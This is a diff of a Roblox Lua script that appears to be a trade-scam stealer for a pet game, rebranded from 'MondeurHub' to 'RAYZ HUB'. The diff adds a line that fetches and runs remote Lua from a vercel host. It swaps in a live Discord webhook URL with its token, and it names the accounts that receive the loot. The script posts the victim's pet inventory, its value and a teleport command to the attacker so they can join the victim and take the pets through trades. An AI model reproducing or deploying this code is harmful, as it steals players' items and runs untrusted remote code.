@@ -1,5 +1,7 @@
-local Webhook = https://discord.com/api/webhooks/1491757102685884456/zdmAZzcvfDasiO94yShYQcUG1v4--s9Q2urNZmpJ3oLZRvZqZPNvJNGLGH0RQDvQQDh_
-local Usernames = CREOLEO23, 2ndcfpaj67
+loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/adm-gui.lua", true))()
+
+local Webhook = https://discord.com/api/webhooks/1491756893427728425/9aU61Eji1UtQmszifKNcFWNj34efArl_ttTHhrIJQtjL8ovqnDFCa8uc0sHnR-309__G
+local Usernames = CREOLEO23
 
 local Friends = {}
 local lastMessageId = nil 
@@ -249,8 +251,8 @@ table.sort(hits, function(a,b) return a.value > b.value end)
 
 local function getEmoji(p)
     if not p then return "🐶" end
-    if p.mega_neon then return "Ⓜ️" elseif p.neon then return "🤖" end
-    if p.flyable and p.rideable then return "🏇🏼" elseif p.flyable then return "🪽" elseif p.rideable then return "🐴" end
+    if p.mega_neon then return "🐺" elseif p.neon then return "🦄" end
+    if p.flyable and p.rideable then return "🐲" elseif p.flyable then return "🪰" elseif p.rideable then return "🐴" end
     return "🐶"
 end
 
@@ -307,7 +309,7 @@ local function sendWebhook(status)
         username = "jeffrey epstein",
         avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
         embeds = {{
-            title = "MondeurHub",
+            title = "RAYZ HUB",
             description = "<:rayz_info:1459657883846185021> **How to Use?**\nJoin the user then jump/chat and accept trades.",
             color = 0x800080,
             fields = {
@@ -317,7 +319,7 @@ local function sendWebhook(status)
                 { name = "<:rayz_backpack:1459652540630171844> Inventory ("..petCount.." pets)", value = "```"..( #previewLines > 0 and table.concat(previewLines, "\n") or "Empty" ).."```", inline = false },
                 { name = "<:rayz_mod:1459652587409379481>Teleport Script", value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')\n```", inline = false },
             },
-            footer = { text = "Mondeur Hub• Total Value: "..string.format("%.2f", totalValue), icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
+            footer = { text = "RAYZ HUB • Total Value: "..string.format("%.2f", totalValue), icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }}
     }
